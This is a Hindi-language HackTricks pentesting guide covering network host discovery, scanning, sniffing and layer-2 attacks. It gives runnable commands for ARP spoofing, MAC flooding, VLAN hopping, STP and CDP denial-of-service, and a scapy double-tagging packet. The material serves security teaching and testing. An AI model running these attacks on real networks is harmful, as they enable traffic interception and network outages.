# Pentesting नेटवर्क

{{#include ../../banners/hacktricks-training.md}}



## बाहरी से hosts का पता लगाना

यह एक **संक्षिप्त अनुभाग** होगा कि कैसे **IPs responding** को **इंटरनेट** से खोजा जाए।\
इस स्थिति में आपके पास कुछ **scope of IPs** (शायद कई **ranges**) हो सकते हैं और आपको बस यह पता लगाना है कि **कौन से IPs responding हैं**।

### ICMP

यह किसी **host** के up होने का सबसे **आसान** और **तेज़** तरीका है।\
आप कुछ **ICMP** packets भेजकर **responses** की उम्मीद कर सकते हैं। सबसे आसान तरीका बस एक **echo request** भेजना और response की उम्मीद करना है। आप यह साधारण `ping` का उपयोग करके कर सकते हैं या **ranges** के लिए `fping` का उपयोग करें।\
आप **nmap** का भी उपयोग कर सकते हैं ताकि अन्य प्रकार के ICMP packets भेजे जा सकें (यह सामान्य ICMP echo request-response पर लगे filters से बचने में मदद करेगा)।
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

यह बहुत आम है कि सभी तरह के ICMP पैकेट फ़िल्टर किए जा रहे हों। तो, किसी host के up होने की जाँच करने के लिए आप जो कर सकते हैं वह है **open ports ढूँढ़ने की कोशिश करना**। प्रत्येक host के पास **65535 ports** होते हैं, इसलिए अगर आपका "big" scope है तो आप **प्रत्येक पोर्ट** हर host पर यह टेस्ट नहीं कर सकते कि वह open है या नहीं — यह बहुत समय लेगा。\
तो, आपको चाहिए एक **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) और उन **सबसे ज़्यादा इस्तेमाल होने वाले ports** की सूची:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
आप यह कदम `nmap` के साथ भी कर सकते हैं, लेकिन यह धीमा है और कुछ हद तक `nmap` को hosts up की पहचान करने में समस्याएँ होती हैं।

### HTTP Port Discovery

यह सिर्फ एक TCP port discovery है जो तब उपयोगी है जब आप **HTTP की खोज पर ध्यान केंद्रित करना** **services** चाहें:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

आप कुछ **UDP port open** की जांच कर सकते हैं ताकि यह तय किया जा सके कि आपको किसी **host** पर **pay more attention** करना चाहिए या नहीं। क्योंकि **UDP services** आमतौर पर एक खाली UDP probe packet पर **don't respond** करती हैं और **any data** वापस नहीं भेजतीं, इसलिए यह बताना मुश्किल होता है कि कोई पोर्ट filtered है या open। 

इसे तय करने का सबसे आसान तरीका है कि आप उस चल रही service से संबंधित एक packet भेजें, और चूँकि आपको पता नहीं होता कौन सी service चल रही है, इसलिए आपको port number के आधार पर सबसे संभावित सेवा आज़मानी चाहिए:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
पहले सुझाई गई nmap लाइन **/24** रेंज के प्रत्येक होस्ट पर **top 1000 UDP ports** की जांच करेगी, लेकिन इससे भी **>20min** लगेंगे। अगर आपको **fastest results** चाहिए तो आप [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) का उपयोग कर सकते हैं: `./udp-proto-scanner.pl 199.66.11.53/24`। यह इन **UDP probes** को उनके **expected port** पर भेजेगा (एक /24 रेंज के लिए यह सिर्फ़ 1 min लेगा): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP पोर्ट डिस्कवरी
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Here you can find a nice guide of all the well known Wifi attacks at the time of the writing:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## नेटवर्क के अंदर से hosts की खोज

यदि आप network के अंदर हैं, तो पहली चीज़ों में से एक जो आप करना चाहेंगे वह है **अन्य hosts की खोज**। आप कितना **noise** पैदा कर सकते/चाहते हैं, इसके आधार पर अलग-अलग क्रियाएँ की जा सकती हैं:

### Passive

आप इन टूल्स का उपयोग connected network के अंदर passive तरीके से hosts की खोज करने के लिए कर सकते हैं:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### सक्रिय

ध्यान दें कि [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) में टिप्पणी की गई तकनीकें यहाँ भी **लागू की जा सकती हैं**.\
लेकिन, चूंकि आप अन्य hosts के साथ **same network** में हैं, आप **और अधिक चीज़ें** कर सकते हैं:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### सक्रिय ICMP

ध्यान दें कि _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) में बताई गई तकनीकें यहाँ भी **लागू की जा सकती हैं**।\
लेकिन, चूँकि आप अन्य **hosts** के साथ उसी **network** में हैं, आप और भी अधिक चीजें कर सकते हैं:

- यदि आप **ping** किसी **subnet broadcast address** पर करते हैं तो ping हर **host** तक पहुँचनी चाहिए और वे **आपको** **respond** कर सकते हैं: `ping -b 10.10.5.255`
- **network broadcast address** को ping करने पर आप अन्य **subnets** के अंदर भी hosts पा सकते हैं: `ping -b 255.255.255.255`
- `nmap` के `-PE`, `-PP`, `-PM` flags का उपयोग host discovery करने के लिए करें, जो क्रमशः **ICMPv4 echo**, **timestamp**, और **subnet mask requests** भेजते हैं: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan का उपयोग कंप्यूटरों को एक **network message** के माध्यम से **turn on** करने के लिए किया जाता है। उस magic packet में केवल एक **MAC Dst** दिया जाता है और फिर वही MAC उसी paket के अंदर **16 बार repeated** होता है।\
यह प्रकार के packets आमतौर पर एक **ethernet 0x0842** में या **UDP packet to port 9** में भेजे जाते हैं।\
यदि **no \[MAC]** दिया जाता है, तो packet **broadcast ethernet** को भेजा जाता है (और broadcast MAC वही होगा जिसे repeat किया जा रहा है)।
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## होस्ट स्कैनिंग

एक बार जब आपने उन सभी IPs (external या internal) का पता लगा लिया है जिन्हें आप गहराई से scan करना चाहते हैं, तो विभिन्न क्रियाएँ की जा सकती हैं।

### TCP

- **खुला** port: _SYN --> SYN/ACK --> RST_
- **बंद** port: _SYN --> RST/ACK_
- **फ़िल्टर किया गया** port: _SYN --> \[NO RESPONSE]_
- **फ़िल्टर किया गया** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP पोर्ट को स्कैन करने के 2 विकल्प हैं:

- एक **UDP packet** भेजें और प्रतिक्रिया _**ICMP unreachable**_ की जाँच करें यदि पोर्ट **closed** है (कई मामलों में ICMP **filtered** होगा इसलिए आपको यह जानकारी नहीं मिलेगी कि पोर्ट closed है या open)।
- एक **formatted datagrams** भेजें ताकि किसी **service** से response मिल सके (जैसे DNS, DHCP, TFTP और अन्य, जो _nmap-payloads_ में सूचीबद्ध हैं)। यदि आपको **response** मिलता है, तो पोर्ट **open** है।

**Nmap** दोनों विकल्पों को "-sV" का उपयोग करके मिलाएगा (UDP scans बहुत धीमे होते हैं), लेकिन ध्यान दें कि UDP scans, TCP scans की तुलना में धीमे होते हैं:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** को **TCP (Transmission Control Protocol)** और **UDP (User Datagram Protocol)** के साथ उपयोग के लिए डिज़ाइन किया गया है। इसका मुख्य उद्देश्य IP नेटवर्कों पर टेलीफोनी डेटा के ट्रांसपोर्ट को सुविधाजनक बनाना है, जो **Signaling System 7 (SS7)** में पाई जाने वाली कई विश्वसनीयता सुविधाओं को प्रतिबिंबित करता है। **SCTP** **SIGTRAN** प्रोटोकॉल परिवार का एक मूल घटक है, जो SS7 सिग्नल को IP नेटवर्क पर ट्रांसपोर्ट करने का लक्ष्य रखता है।

**SCTP** के लिए समर्थन विभिन्न ऑपरेटिंग सिस्टम द्वारा प्रदान किया जाता है, जैसे **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, और **VxWorks**, जो दूरसंचार और नेटवर्किंग के क्षेत्र में इसकी व्यापक स्वीकृति और उपयोगिता को दर्शाता है।

nmap द्वारा SCTP के लिए दो अलग स्कैन प्रदान किए जाते हैं: _-sY_ और _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revealing Internal IP Addresses

**Misconfigured routers, firewalls, and network devices** कभी-कभी network probes का जवाब **nonpublic source addresses** का उपयोग करते हुए देते हैं। **tcpdump** का उपयोग टेस्टिंग के दौरान private addresses से प्राप्त packets की पहचान करने के लिए किया जा सकता है। विशेष रूप से, Kali Linux पर packets को **eth2 interface** पर capture किया जा सकता है, जो public Internet से accessible है। यह ध्यान रखना महत्वपूर्ण है कि यदि आपका setup किसी NAT या a Firewall के पीछे है, तो ऐसे packets संभवतः filtered out हो जाएंगे।
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing के दौरान आप कैप्चर किए गए frames और packets की समीक्षा करके IP ranges, subnet sizes, MAC addresses, और hostnames के विवरण जान सकते हैं। अगर नेटवर्क misconfigured है या switching fabric पर दबाव है, तो हमलावर passive network sniffing के माध्यम से संवेदनशील सामग्री capture कर सकते हैं।

अगर एक switched Ethernet network सही तरीके से configured है, तो आप केवल broadcast frames और आपके MAC address के लिए निर्धारित सामग्री ही देखेंगे।

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
आप दूरस्थ मशीन से SSH सत्र के माध्यम से Wireshark को GUI के रूप में उपयोग करके realtime में packets capture भी कर सकते हैं।
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

बिलकुल।

### Capturing credentials

आप [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) जैसे टूल्स का उपयोग pcap या live interface से credentials को parse करने के लिए कर सकते हैं।

## LAN attacks

### ARP spoofing

ARP Spoofing में gratuitous ARPResponses भेजना शामिल है ताकि यह दर्शाया जा सके कि किसी मशीन का IP हमारे डिवाइस के MAC के साथ संबंधित है। फिर, लक्षित मशीन ARP table बदल लेगी और जब भी वह spoofed IP से संपर्क करना चाहेगी तो वह हमारी मशीन से संपर्क करेगी।

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

switch की CAM table को overflow करें — अलग-अलग source mac address वाले बहुत सारे packets भेजकर। जब CAM table भर जाती है, तो switch hub की तरह व्यवहार करने लगता है (broadcasting all the traffic)।
```bash
macof -i <interface>
```
आधुनिक स्विचों में यह कमज़ोरी ठीक कर दी गई है।

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** को trunking के लिए एक automatic सिस्टम की सुविधा देने हेतु एक लिंक-लेयर प्रोटोकॉल के रूप में डिज़ाइन किया गया है, जो स्विचों को स्वचालित रूप से पोर्ट्स को trunk mode (Trunk) या non-trunk mode के लिए चुनने की अनुमति देता है। 

अक्सर **DTP** का उपयोग उपयुक्त नहीं नेटवर्क डिजाइन का संकेत माना जाता है, जो यह ज़ोर देता है कि trunk केवल जहां आवश्यक हो वहां मैन्युअली कॉन्फ़िगर किए जाने चाहिए और उचित डॉक्यूमेंटेशन सुनिश्चित किया जाना चाहिए।

डिफ़ॉल्ट रूप से, स्विच पोर्ट्स Dynamic Auto mode में काम करने के लिए सेट होते हैं, जिसका अर्थ है कि वे पड़ोसी स्विच द्वारा संकेत मिलने पर trunking आरंभ करने के लिए तैयार रहते हैं। जब कोई pentester या attacker स्विच से जुड़कर एक DTP Desirable frame भेजता है, तो सुरक्षा चिंता उत्पन्न होती है क्योंकि यह पोर्ट को trunk mode में डालने के लिए मजबूर कर सकता है। इस क्रिया से attacker STP frame विश्लेषण के माध्यम से VLANs को सूचीबद्ध कर सकता है और virtual interfaces सेटअप करके VLAN segmentation को दरकिनार कर सकता है।

कई स्विचों में डिफ़ॉल्ट रूप से मौजूद DTP का प्रयोग adversaries द्वारा स्विच के व्यवहार की नकल करने के लिए किया जा सकता है, जिससे वे सभी VLANs का traffic एक्सेस कर सकें। स्क्रिप्ट [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) का उपयोग किसी interface की निगरानी के लिए किया जाता है, यह बताने के लिए कि स्विच Default, Trunk, Dynamic, Auto, या Access mode में है — जिसमें Access mode ही ऐसा configuration है जो VLAN hopping attacks के प्रति प्रतिरक्षित है। यह टूल स्विच की vulnerability स्थिति का आकलन करता है।

यदि नेटवर्क में vulnerability की पहचान होती है, तो _**Yersinia**_ टूल का उपयोग DTP प्रोटोकॉल के माध्यम से "enable trunking" करने के लिए किया जा सकता है, जिससे सभी VLANs के पैकेट्स का अवलोकन संभव हो जाता है।
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANs को enumerate करने के लिए यह भी संभव है कि DTP Desirable frame को script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** के साथ बनाया जाए। D**o स्क्रिप्ट को किसी भी परिस्थिति में बाधित न करें। यह हर तीन सेकंड में DTP Desirable इंजेक्ट करता है। **स्विच पर dynamically created trunk channels केवल पांच मिनट तक ही रहते हैं। पांच मिनट के बाद, trunk हट जाता है।**
```
sudo python3 DTPHijacking.py --interface eth0
```
मैं यह बताना चाहूंगा कि **Access/Desirable (0x03)** यह संकेत करता है कि DTP frame Desirable type का है, जो port को Trunk mode पर switch करने के लिए कहता है। और **802.1Q/802.1Q (0xa5** दर्शाता है कि **802.1Q** encapsulation type है।

STP frames का विश्लेषण करने पर, **हम VLAN 30 और VLAN 60 के अस्तित्व के बारे में जानते हैं।**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attacking specific VLANs

एक बार जब आप VLAN IDs और IPs मान जान लेते हैं, तो आप **एक वर्चुअल इंटरफ़ेस कॉन्फ़िगर करके किसी विशिष्ट VLAN पर attack कर सकते हैं**।\
यदि DHCP उपलब्ध नहीं है, तो स्थिर IP पता सेट करने के लिए _ifconfig_ का उपयोग करें।
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

चर्चित हमला **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** अन्य VLANs में **स्वचालित रूप से** टूल द्वारा निष्पादित किया जाता है: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

यदि कोई हमलावर **MAC, IP and VLAN ID of the victim host** का मान जानता है, तो वह अपने निर्दिष्ट VLAN और पीड़ित के VLAN के साथ एक **double tag a frame** करके एक packet भेजने की कोशिश कर सकता है। चूँकि **victim won't be able to connect back** हमलावर से वापस कनेक्ट नहीं कर पाएगा, इसलिए हमलावर के लिए सबसे अच्छा विकल्प यह है कि वह **communicate via UDP** ऐसे प्रोटोकॉल के साथ करे जो कुछ रोचक क्रियाएँ कर सकते हैं (जैसे SNMP)।

हमलावर का एक और विकल्प है कि वह **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (संभवतः इंटरनेट के माध्यम से) लॉन्च करे। फिर, अगर पीड़ित की ओर से कुछ packets मिलते हैं तो हमलावर अपने दूसरे होस्ट पर उन packets को sniff कर सकता है।

![](<../../images/image (190).png>)

To perform this attack you could use scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

यदि आपके पास **access to a switch that you are directly connected to** है, तो आप नेटवर्क के भीतर **bypass VLAN segmentation** करने में सक्षम हैं। बस **switch the port to trunk mode** (जिसे सामान्यतः trunk कहा जाता है), लक्षित **VLANs** की IDs वाले **virtual interfaces** बनाएं, और एक **IP address** configure करें। आप पते को dynamically (DHCP) request करने की कोशिश कर सकते हैं या उसे statically configure कर सकते हैं। मामला पर निर्भर करता है।

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

कुछ environments में, जैसे guest wireless networks, **port isolation (also known as private VLAN)** सेटिंग्स लागू की जाती हैं ताकि एक wireless access point से connected clients आपस में सीधे communicate न कर सकें। हालांकि, एक technique पहचानी गई है जो इन isolation उपायों को circumvent कर सकती है। यह technique या तो network ACLs की कमी या उनकी गलत configuration का फायदा उठाती है, जिससे **IP packets** को router के माध्यम से route करके उसी नेटवर्क पर दूसरे client तक पहुँचाया जा सकता है।

यह attack उस समय किया जाता है जब एक विशेष **packet that carries the IP address of the destination client but with the router's MAC address** बनाया जाता है। इससे router गलती से उस packet को target client को forward कर देता है। यह approach Double Tagging Attacks में उपयोग किए जाने वाले तरीके के समान है, जहाँ victim तक पहुँचने योग्य host को control करने की ability का उपयोग सुरक्षा दोष को exploit करने के लिए किया जाता है।

**Attack के मुख्य चरण:**

1. **Crafting a Packet:** एक विशेष रूप से तैयार किया गया packet target client का IP address शामिल करता है पर router के MAC address के साथ।
2. **Exploiting Router Behavior:** तैयार किया गया packet router को भेजा जाता है, जो configuration के कारण उसे target client को redirect कर देता है, और private VLAN settings द्वारा प्रदान किए गए isolation को bypass कर देता है।

### VTP Attacks

VTP (VLAN Trunking Protocol) VLAN management को केंद्रीयकृत करता है। यह VLAN database की integrity बनाए रखने के लिए revision numbers का उपयोग करता है; किसी भी modification से यह संख्या बढ़ जाती है। Switches उन configurations को अपनाते हैं जिनके revision numbers अधिक होते हैं, और अपने VLAN databases को अपडेट कर लेते हैं।

#### VTP Domain Roles

- **VTP Server:** VLANs का प्रबंधन करता है—बनाता है, हटाता है, संशोधित करता है। यह domain के सदस्यों को VTP announcements broadcast करता है।
- **VTP Client:** VTP announcements प्राप्त करता है ताकि यह अपने VLAN database को synchronize कर सके। इस role को local VLAN configuration modifications से रोका गया है।
- **VTP Transparent:** VTP updates में शामिल नहीं होता पर VTP announcements को forward करता है। VTP attacks से अप्रभावित रहता है और इसका revision number हमेशा शून्य रहता है।

#### VTP Advertisement Types

- **Summary Advertisement:** VTP server द्वारा हर 300 seconds में broadcast की जाती है, और इसमें essential domain information होती है।
- **Subset Advertisement:** VLAN configuration changes के बाद भेजी जाती है।
- **Advertisement Request:** एक VTP client द्वारा Summary Advertisement माँगने के लिए जारी की जाती है, आमतौर पर तब जब वह higher configuration revision number detecting करता है।

VTP vulnerabilities केवल trunk ports के माध्यम से exploit की जा सकती हैं क्योंकि VTP announcements केवल इन्हीं के माध्यम से circulate होते हैं। Post-DTP attack परिदृश्य VTP की ओर मुड़क सकते हैं। Yersinia जैसे tools VTP attacks को सुगम बना सकते हैं, जिनका उद्देश्य VLAN database को wipe करना और नेटवर्क को प्रभावी रूप से बाधित करना है।

नोट: यह चर्चा VTP version 1 (VTPv1) से संबंधित है।
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia के ग्राफिकल मोड में, VLAN database को purge करने के लिए deleting all VTP vlans विकल्प चुनें।

### STP Attacks

**यदि आप अपने interfaces पर BPDU frames को capture नहीं कर सकते हैं, तो STP attack में सफल होने की संभावना कम है।**

#### **STP BPDU DoS**

बहुत सारे BPDUs TCP (Topology Change Notification) या Conf (वे BPDUs जो topology बनते समय भेजे जाते हैं) भेजने पर switches ओवरलोड हो जाते हैं और सही तरीके से काम करना बंद कर देते हैं।
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

जब एक TCP भेजा जाता है, तो switches की CAM table को 15s में हटा दिया जाएगा। फिर, यदि आप लगातार इस प्रकार के packets भेजते रहते हैं, तो CAM table लगातार (या हर 15segs) पुनः आरम्भ होती रहेगी और जब यह पुनः आरम्भ होती है, तो switch एक hub की तरह व्यवहार करेगा।
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

हमलावर नेटवर्क का STP root बनने के लिए एक switch के व्यवहार का अनुकरण करता है। इसके बाद, अधिक डेटा इसके माध्यम से गुज़रेगा। यह तब दिलचस्प होता है जब आप दो अलग-अलग switches से जुड़े होते हैं.\
यह BPDUs CONF packets भेजकर किया जाता है, जो बताते हैं कि **priority** value वास्तविक root switch की वास्तविक priority से कम है।
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**अगर हमलावर 2 switches से जुड़ा हुआ है तो वह नए tree का root बन सकता है और उन switches के बीच का सारा traffic उसके माध्यम से गुजरेगा** (एक MITM attack किया जाएगा).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP हमले

CISCO Discovery Protocol (CDP) CISCO डिवाइसों के बीच संचार के लिए आवश्यक है, जो उन्हें **एक-दूसरे की पहचान करने और कॉन्फ़िगरेशन विवरण साझा करने** की अनुमति देता है।

#### पैसिव डेटा संग्रह <a href="#id-0e0f" id="id-0e0f"></a>

CDP को सभी पोर्टों के माध्यम से जानकारी ब्रॉडकास्ट करने के लिए कॉन्फ़िगर किया जाता है, जो सुरक्षा जोखिम पैदा कर सकता है। एक हमला करने वाला, स्विच पोर्ट से जुड़ने पर, network sniffers जैसे **Wireshark**, **tcpdump**, या **Yersinia** तैनात कर सकता है। यह क्रिया नेटवर्क डिवाइस के बारे में संवेदनशील जानकारी प्रकट कर सकती है, जैसे उसका मॉडल और जिस Cisco IOS संस्करण पर यह चलता है। आक्रांत फिर पहचान किए गए Cisco IOS संस्करण में विशिष्ट कमजोरियों को लक्षित कर सकता है।

#### CDP टेबल फ्लडिंग उत्पन्न करना <a href="#id-0d6a" id="id-0d6a"></a>

एक अधिक आक्रामक तरीका स्विच की मेमोरी को ओवरवेल्म कर के, वैध CISCO डिवाइस होने का नाटक करते हुए, Denial of Service (DoS) हमला शुरू करने में शामिल है। नीचे Yersinia, एक परीक्षण के लिए डिज़ाइन किया गया network tool, का उपयोग करके ऐसे हमले को शुरू करने के लिए कमांड अनुक्रम दिया गया है:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
इस हमले के दौरान, switch की CPU और CDP neighbor table पर भारी दबाव पड़ता है, जिससे अत्यधिक संसाधन उपयोग के कारण अक्सर **“network paralysis”** की स्थिति हो जाती है।

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
आप [**scapy**](https://github.com/secdev/scapy/) का भी उपयोग कर सकते हैं। सुनिश्चित करें कि आपने इसे `scapy/contrib` पैकेज के साथ इंस्टॉल किया है।

### VoIP हमले और VoIP Hopper टूल

VoIP फोन, जो बढ़ते हुए IoT उपकरणों के साथ एकीकृत होते जा रहे हैं, विशेष फोन नंबरों के माध्यम से दरवाज़े अनलॉक करने या थर्मोस्टैट को नियंत्रित करने जैसी कार्यक्षमताएँ प्रदान करते हैं। हालांकि, यह एकीकरण सुरक्षा जोखिम पैदा कर सकता है।

टूल [**voiphopper**](http://voiphopper.sourceforge.net) विभिन्न वातावरणों में एक VoIP फोन का अनुकरण (emulate) करने के लिए डिज़ाइन किया गया है (Cisco, Avaya, Nortel, Alcatel-Lucent)। यह CDP, DHCP, LLDP-MED, और 802.1Q ARP जैसे प्रोटोकॉल का उपयोग करके वॉयस नेटवर्क का VLAN ID खोजता है।

**VoIP Hopper** Cisco Discovery Protocol (CDP) के लिए तीन मोड प्रदान करता है:

1. **Sniff Mode** (`-c 0`): VLAN ID पहचानने के लिए नेटवर्क पैकेट्स का विश्लेषण करता है।
2. **Spoof Mode** (`-c 1`): वास्तविक VoIP डिवाइस के पैकेट्स की नकल करते हुए कस्टम पैकेट्स जनरेट करता है।
3. **Spoof with Pre-made Packet Mode** (`-c 2`): किसी विशिष्ट Cisco IP phone मॉडल के बिल्कुल समान पैकेट्स भेजता है।

तेजी के लिए पसंदीदा मोड तीसरा है। इसके लिए निम्न निर्दिष्ट करना आवश्यक है:

- हमलावर का नेटवर्क इंटरफ़ेस (`-i` parameter)।
- उस VoIP डिवाइस का नाम जिसका अनुकरण किया जा रहा है (`-E` parameter), Cisco नामकरण फ़ॉर्मैट का पालन करते हुए (उदाहरण के लिए, SEP के बाद MAC address)।

